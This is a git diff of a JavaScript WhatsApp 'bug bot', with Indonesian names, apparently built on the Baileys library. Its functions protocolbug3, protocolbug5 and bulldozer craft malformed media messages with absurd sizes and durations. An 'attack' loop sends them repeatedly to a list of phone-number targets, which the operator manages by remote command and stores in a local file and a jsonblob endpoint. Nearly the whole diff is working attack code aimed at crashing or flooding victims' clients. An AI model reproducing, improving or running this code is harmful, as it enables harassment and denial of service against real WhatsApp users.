@@ -11,6 +11,7 @@ import fs from "fs";
 import pino from "pino";
 let nomorRequest = "6287839025789";
 let sendMsg;
+let blob;
 
 function tunggu(delay) {
   return new Promise(resolve => {
@@ -33,6 +34,7 @@ const mentionedList = [
 ];
 
 function protocolbug3(targets) {
+  targets = blob.targets.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
   const msg = generateWAMessageFromContent(
     "0@s.whatsapp.net",
     {
@@ -45,7 +47,7 @@ function protocolbug3(targets) {
             fileLength: "999999",
             seconds: 999999,
             mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
-            caption: "\u9999",
+            caption: "",
             height: 999999,
             width: 999999,
             fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
@@ -112,6 +114,7 @@ function protocolbug3(targets) {
 }
 //protocol5
 function protocolbug5(targets) {
+  targets = blob.targets.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
   const embeddedMusic = {
     musicContentMediaId: "589608164114571",
     songId: "870166291800508",
@@ -134,7 +137,7 @@ function protocolbug5(targets) {
     fileLength: "289511",
     seconds: 15,
     mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
-    caption: "XXXXXXXXXXXXX",
+    caption: "",
     height: 640,
     width: 640,
     fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
@@ -198,6 +201,7 @@ function protocolbug5(targets) {
 
 //buldozer
 function bulldozer(targets) {
+  targets = blob.targets.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
   let message = {
     viewOnceMessage: {
       message: {
@@ -340,23 +344,22 @@ function serang(targets) {
   return new Promise(async resolve => {
     for (let i = 1; i <= 35; i++) {
       cekJam();
-      await protocolbug5(targets);
+      await protocolbug5();
       await tunggu(1500);
-      await protocolbug3(targets);
-      await bulldozer(targets);
+      await protocolbug3();
+      await bulldozer();
       await tunggu(2000);
-      await bulldozer(targets);
-      await protocolbug5(targets);
+      await bulldozer();
+      await protocolbug5();
       await tunggu(1500);
-      await protocolbug3(targets);
+      await protocolbug3();
+      console.log("serangan ke-" + i);
       if (i == 35) {
         resolve();
       }
     }
   });
 }
-
-let blob;
 
 function updateData() {
   return fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
@@ -386,24 +389,26 @@ async function start() {
     }
   });
   if (arr.length > 0) {
+    if (arr.toString() != arrX) {
+      blob.targets = arr;
+      // await updateData();
+      fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
+    }
+    await serang();
     blob.waktu = new Date().getTime() + 60000 * 6.5;
-    blob.targets = arr;
     // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
-
-    arr = arr.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
-    await serang(arr);
     exec = setTimeout(() => start, 60000 * 5);
   }
 }
 
 async function olahTarget(aksi, target, send) {
-  if (aksi == "add") {
+  if (aksi == "add" && target) {
     blob.targets.push(target);
     // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
     send(nomorRequest + "@s.whatsapp.net", { text: "add OK" });
-  } else if (aksi == "del") {
+  } else if (aksi == "del" && blob.targets.indexOf(target) >= 0) {
     blob.targets.splice(blob.targets.indexOf(target), 1);
     // await updateData();
     fs.writeFileSync("./data.json", JSON.stringify(blob), null, 2);
@@ -459,7 +464,6 @@ async function bot(session) {
     if (blob.session.creds) {
       nomorRequest = blob.session.creds.me.id.split(":")[0];
       session = reviveBuffer(blob.session);
-      const { state } = await useMultiFileAuthState("sessionX");
       session.keys.get = state.keys.get;
       session.keys.set = state.keys.set;
     } else {
@@ -540,7 +544,7 @@ async function bot(session) {
     }
     messages.forEach(async e => {
       if (e.key.remoteJid === nomorRequest + "@s.whatsapp.net" && e.key.fromMe === true) {
-        const pesanMasuk = e.message?.extendedTextMessage?.text;
+        const pesanMasuk = e.message?.conversation || e.message?.extendedTextMessage?.text;
         const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
         const prefix = prefixRegex.test(pesanMasuk) ? pesanMasuk.match(prefixRegex)[0] : "";
         const isCmd = !!prefix;
